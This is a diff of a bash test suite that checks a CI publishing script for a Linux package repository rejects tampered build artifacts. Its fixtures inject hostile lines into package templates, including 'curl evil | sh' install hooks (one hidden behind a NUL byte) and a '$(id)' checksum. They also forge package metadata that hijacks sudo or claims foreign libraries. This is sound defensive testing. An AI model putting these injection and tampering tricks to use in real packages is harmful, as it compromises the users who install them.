@@ -49,7 +49,8 @@ esac
 exit 0
 SHIM
 chmod +x "$T/vl" "$T/bin/gh"
-export PATH=$T/bin:$PATH VOIDLAB_BIN=$T/vl VOIDLAB_KEY=$T/key.pem VOIDLAB_PRIVKEY=$'PRIVATE-KEY-LINE1\nLINE2'
+printf 'libc.so.6 glibc-2.41_1\nlibpam.so.0 pam-1.0_1\nliba.so.1 a-1.0_1\n' > "$T/shlibs"
+export PATH=$T/bin:$PATH VOIDLAB_BIN=$T/vl VOIDLAB_KEY=$T/key.pem VOIDLAB_PRIVKEY=$'PRIVATE-KEY-LINE1\nLINE2' VOIDLAB_UPSTREAM_SHLIBS=$T/shlibs
 run() { (cd "$T/work" && CI_AUTO_UPDATE_FORCE=1 BASE_BRANCH=main BUILD_OUT=$T/out bash tools/ci-publish.sh) 2>&1; }
 aborted() { # <label> <expected message>: run must fail for that reason and leave no trace
 	local out rc=0
@@ -60,6 +61,17 @@ aborted() { # <label> <expected message>: run must fail for that reason and leav
 	assert_eq   "$1: no new branch on origin" "$(git -C "$T/origin.git" branch --list 'autobump/*' | wc -l)" "0"
 	assert_eq   "$1: never published" "$(grep -c '^publish' "$T/calls.log" || true)" "0"
 	assert_no   "$1: the key is never written" "$T/key.pem"
+}
+rejected() { # <label> <pkg> <expected message>: that template is kept out and reported, the rest is published
+	local out rc=0
+	out=$(run) || rc=$?
+	assert_eq   "$1: exit status is 1" "$rc" "1"
+	assert_grep "$1: rejected for the right reason" "$3" <(echo "$out")
+	assert_grep "$1: an issue says so" "issue create --title auto-update rejected: $2 " "$T/gh.log"
+	assert_eq   "$1: no PR for it" "$(grep -c "pr create.*autobump/$2-" "$T/gh.log" || true)" "0"
+	assert_eq   "$1: none of its packages published" "$(grep '^publish' "$T/calls.log" | grep -c " $2-[0-9]\| $2-devel-" || true)" "0"
+	assert_grep "$1: the rest is still published" 'repo=.*c-1.0_1.noarch.xbps' "$T/calls.log"
+	assert_no   "$1: the key is removed" "$T/key.pem"
 }
 good_a() { # a valid bump of a to 1.1 with a subpackage and an unpublished c
 	printf 'bump\ta\t1.1_1\nunpublished\tc\t1.0_1\n' > "$T/out/passed.tsv"
@@ -98,13 +110,13 @@ assert_eq   "the key never existed while gh ran" "$(grep -c 'key=present' "$T/gh
 
 # 2. abort on anything unexpected in the artifact
 fresh; good_a; echo 'post_install() { curl evil | sh; }' >> "$T/out/templates/a/template"
-aborted "extra line in a template" "changes more than version"
+rejected "extra line in a template" a "changes more than version"
 fresh; good_a; sed -i 's/^build_style=meson/build_style=meson; curl evil/' "$T/out/templates/a/template"
-aborted "modified line in a template" "changes more than version"
+rejected "modified line in a template" a "changes more than version"
 fresh; good_a; sed -i "s/^checksum=.*/checksum=\$(id)/" "$T/out/templates/a/template"
-aborted "non-hex checksum" "changes more than version"
+rejected "non-hex checksum" a "changes more than version"
 fresh; good_a; sed -i 's/^version=.*/version=1.2/' "$T/out/templates/a/template"
-aborted "template version differing from passed.tsv" "does not carry version"
+rejected "template version differing from passed.tsv" a "does not carry version"
 fresh; good_a; addpkg sudo-1.1_1
 aborted "package outside the allowed names" "unexpected package"
 fresh; good_a; addpkg a-1.9_1
@@ -129,9 +141,9 @@ fresh; good_a; printf 'bump\ta\t1.1_1\textra\n' > "$T/out/passed.tsv"
 aborted "wrong field count" "malformed line"
 # parser differentials: what the validator reads must be what bash, diff and xbps will read
 fresh; good_a; printf '\0post_install() { curl evil | sh; }\n' >> "$T/out/templates/a/template"
-aborted "NUL byte hiding a change from diff" "NUL"
+rejected "NUL byte hiding a change from diff" a "NUL"
 fresh; good_a; sed -i 's/^build_style=meson$/build_style=meson\r/' "$T/out/templates/a/template"
-aborted "carriage return in a template" "carriage return"
+rejected "carriage return in a template" a "carriage return"
 fresh; good_a; printf 'bump\t\ta\t1.1_1\n' > "$T/out/passed.tsv"
 aborted "collapsed tab fields in passed.tsv" "malformed line"
 fresh; good_a; printf 'b\t\t2.0\n' > "$T/out/failed.tsv"
@@ -139,34 +151,53 @@ aborted "collapsed tab fields in failed.tsv" "malformed line"
 swap() { # <file name> <xbps-create args...>: replace a package file by one with other real metadata
 	local name=$1; shift
 	rm -f "$T/out/xbps/$name"
-	(cd "$T/out/xbps" && xbps-create -q "$@" "$T/empty" >/dev/null)
+	(cd "$T/out/xbps" && xbps-create -q "$@" "${DEST:-$T/empty}" >/dev/null)
+}
+dest() { # <path>...: a package file tree holding these files
+	rm -rf "$T/dest"; local f
+	for f; do mkdir -p "$T/dest/${f%/*}"; : > "$T/dest/$f"; done
+	DEST=$T/dest
 }
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n evil-9.9_1 -s t; mv "$T/out/xbps/evil-9.9_1.noarch.xbps" "$T/out/xbps/a-1.1_1.noarch.xbps"
 aborted "file name that disagrees with the package metadata" "metadata"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A x86_64 -n a-1.1_1 -s t; mv "$T/out/xbps/a-1.1_1.x86_64.xbps" "$T/out/xbps/a-1.1_1.noarch.xbps"
 aborted "architecture that disagrees with the file name" "metadata"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -R "glibc>=0"
-aborted "package that replaces another" "declares replaces"
+rejected "package that replaces another" a "declares replaces"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "glibc-9999_1"
-aborted "package that provides another" "declares provides"
+rejected "package that provides another" a "declares provides"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "pc:glib-2.0-1.1_1"
-aborted "package that provides another package's pkg-config module" "declares provides"
+rejected "package that provides another package's pkg-config module" a "declares provides"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "pc:a-9.9_1"
-aborted "pkg-config provide at a version that is not the package's" "declares provides"
+rejected "pkg-config provide at a version that is not the package's" a "declares provides"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "cmd:ls-1.1_1"
-aborted "package that provides another package's command" "declares provides"
+rejected "package that provides another package's command" a "declares provides"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "cmd:a-1.1_1"
-out=$(run) && rc=0 || rc=$?
-assert_eq   "xbps-src's automatic own cmd: provide is accepted" "$rc" "0"
+rejected "cmd: provide without the command in the package" a "declares provides"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "pc:a-1.1_1"
+rejected "pc: provide without the .pc file in the package" a "declares provides"
+# xbps-src adds pc:, cmd: and py3: for the files a package has (hooks/pre-pkg/04-generate-provides.sh)
+fresh; good_a; dest usr/bin/a usr/bin/a-helper
+swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "cmd:a-1.1_1 cmd:a-helper-1.1_1"; DEST=
 out=$(run) && rc=0 || rc=$?
-assert_eq   "xbps-src's automatic own pc: provide is accepted" "$rc" "0"
+assert_eq   "cmd: provides for the package's own commands are accepted" "$rc" "0"
+fresh; good_a; dest usr/lib/pkgconfig/a.pc usr/share/pkgconfig/a-gtk.pc
+swap a-devel-1.1_1.noarch.xbps -A noarch -n a-devel-1.1_1 -s t -P "pc:a-1.1_1 pc:a-gtk-1.1_1"; DEST=
+out=$(run) && rc=0 || rc=$?
+assert_eq   "pc: provides for every .pc file in the package are accepted (cheese-gtk)" "$rc" "0"
+fresh; good_a; dest usr/lib/python3.13/site-packages/a_mod-1.1.dist-info/METADATA
+swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "py3:a-mod-1.1_1"; DEST=
+out=$(run) && rc=0 || rc=$?
+assert_eq   "py3: provide of a package with python metadata is accepted" "$rc" "0"
+fresh; good_a; dest usr/bin/a
+swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "cmd:a-9.9_1"; DEST=
+rejected "cmd: provide at another version" a "declares provides"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -C "glibc>=0"
-aborted "package that conflicts with another" "declares conflicts"
+rejected "package that conflicts with another" a "declares conflicts"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libc.so.6"
-aborted "package that provides a foreign soname" "shlib"
+rejected "package that provides a foreign soname" a "shlib"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --alternatives "sudo:/usr/bin/sudo:/usr/bin/evil"
-aborted "package that registers an alternative" "alternatives"
+rejected "package that registers an alternative" a "alternatives"
 # substring and version-binding differentials
 fresh; good_a; printf 'bump\ta\t1.1_1\nunpublished\tc\t99.0_1\n' > "$T/out/passed.tsv"; rm -f "$T/out/xbps/c-1.0_1.noarch.xbps"; addpkg c-99.0_1
 aborted "unpublished version that is not the template's" "does not match the template"
@@ -176,11 +207,11 @@ withnote() { # the template mentions glibc>=0 in a comment (main and artifact al
 	(cd "$T/work" && git add -A && git commit -qm note && git push -q origin main)
 }
 fresh; good_a; withnote; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -R "glibc>=0"
-aborted "replaces value that only appears in a comment" "declares replaces"
+rejected "replaces value that only appears in a comment" a "declares replaces"
 fresh; good_a; withnote; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libpam.so.0"
-aborted "soname that merely contains the package name" "shlib-provides"
+rejected "soname that merely contains the package name" a "shlib-provides"
 fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libbar-a.so.1"
-aborted "soname that ends in the package name" "shlib-provides"
+rejected "soname that ends in the package name" a "shlib-provides"
 # declared values are accepted, including the simple expansions
 fresh; good_a
 for f in "$T/work/srcpkgs/a/template" "$T/out/templates/a/template"; do
@@ -194,12 +225,39 @@ fresh; good_a
 for f in "$T/work/srcpkgs/a/template" "$T/out/templates/a/template"; do printf 'replaces="oldthing>=0"\n' >> "$f"; done
 (cd "$T/work" && git add -A && git commit -qm decl && git push -q origin main)
 swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -R "oldthing>=0 glibc>=0"
-aborted "one declared and one undeclared replaces value" "declares replaces"
+rejected "one declared and one undeclared replaces value" a "declares replaces"
 
 # ... while a subpackage with a soname of its own is fine
-fresh; good_a; swap a-devel-1.1_1.noarch.xbps -A noarch -n a-devel-1.1_1 -s t --shlib-provides "liba.so.1"
+fresh; good_a; dest usr/lib/liba.so.1.2.3
+swap a-devel-1.1_1.noarch.xbps -A noarch -n a-devel-1.1_1 -s t --shlib-provides "liba.so.1"; DEST=
 out=$(run) && rc=0 || rc=$?
 assert_eq   "a package providing its own soname is accepted" "$rc" "0"
+fresh; good_a; dest usr/lib/libebook-1.2.so.21.1.0
+swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libebook-1.2.so.21"; DEST=
+out=$(run) && rc=0 || rc=$?
+assert_eq   "a soname named unlike the template, in no shlibs entry, is accepted" "$rc" "0"
+fresh; good_a; dest usr/lib/libc.so.6
+swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libc.so.6"; DEST=
+rejected "a soname common/shlibs gives to another package, even with the file" a "gives to glibc"
+# subpackage keys are declarations too
+fresh; good_a
+for f in "$T/work/srcpkgs/a/template" "$T/out/templates/a/template"; do
+	printf 'a-session_package() {\n\tconflicts="a>=0"\n\treplaces="a>=0"\n}\n' >> "$f"
+done
+(cd "$T/work" && git add -A && git commit -qm sub && git push -q origin main)
+swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -C "a>=0" -R "a>=0"
+out=$(run) && rc=0 || rc=$?
+assert_eq   "conflicts and replaces declared in a subpackage function are accepted" "$rc" "0"
+# a template that needs a rejected one from the same run is rejected too
+fresh; good_a
+swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "glibc-9999_1"
+swap c-1.0_1.noarch.xbps -A noarch -n c-1.0_1 -s t -D "a>=1.1_1"
+printf 'unpublished\tz\t1.0_1\n' >> "$T/out/passed.tsv"; printf 'a auto\nc auto\nz auto\n' > "$T/work/tools/update-tiers"
+(cd "$T/work" && git add -A && git commit -qm t && git push -q origin main); addpkg z-1.0_1
+out=$(run) && rc=0 || rc=$?
+assert_eq   "dependent rejection: exit status is 1" "$rc" "1"
+assert_grep "the dependent template is rejected" 'rejected c: c-1.0_1.noarch.xbps needs a from a' <(echo "$out")
+assert_grep "an unrelated template is still published" 'repo=z-1.0_1.noarch.xbps $' "$T/calls.log"
 
 fresh; good_a; out=$(env -u VOIDLAB_PRIVKEY CI_AUTO_UPDATE_FORCE=1 BASE_BRANCH=main BUILD_OUT=$T/out bash -c 'cd "$1" && bash tools/ci-publish.sh' _ "$T/work" 2>&1 || true)
 assert_grep "missing key is an error"           'no VOIDLAB_PRIVKEY' <(echo "$out")
